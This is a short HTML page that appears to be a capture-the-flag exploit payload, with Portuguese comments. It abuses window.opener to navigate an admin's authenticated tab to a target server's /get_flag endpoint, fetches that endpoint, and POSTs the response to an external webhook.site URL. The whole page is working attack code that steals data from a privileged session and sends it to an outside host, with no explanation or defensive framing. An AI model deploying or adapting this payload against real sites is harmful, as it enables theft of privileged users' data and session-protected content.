<!DOCTYPE html>
<html>
  <head>
    <title>Redirecting Admin...</title>
  </head>
  <body>
    <h1>Sending the flag...</h1>
    <script>
      if (window.opener) {
        // Redireciona a aba principal (com cookie de admin) para /get_flag
        window.opener.location = "http://34.134.162.213:17001/get_flag";

        // Após 1.5 segundos, esta aba também tenta pegar a flag
        setTimeout(() => {
          fetch("http://34.134.162.213:17001/get_flag")
            .then(response => response.text())
            .then(flag => {
              // Envia a flag para seu webhook
              fetch("https://webhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad", {
                method: "POST",
                mode: "no-cors",
                body: flag
              });
            });
        }, 1500);
      }
    </script>
  </body>
</html>
